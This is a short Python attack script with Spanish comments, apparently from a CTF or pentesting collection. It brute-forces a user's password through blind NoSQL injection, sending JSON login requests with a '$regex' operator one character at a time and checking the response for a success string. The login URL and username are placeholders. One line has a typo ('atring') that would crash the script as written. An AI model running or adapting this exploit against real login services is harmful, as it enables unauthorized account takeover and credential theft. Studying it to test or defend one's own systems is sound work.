from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables Globales
login_url = "<url>"
characters = string.ascii_lowercase + atring.ascii_uppercase + string.digits

def makeNoSQLI():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24):
        for character in characters:

            post_data = '{"username":"<user>","password":{"$regex":"^%s%s"}}' % (password,character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r= requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user"in r.text: #Entre comillas es un ejemplo que podremos adaptar dependiendo del tipo de respuesta que nos dirija el servicio que estamos atacando, otro ejemplo<Hola user x>
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeNoSQLI()
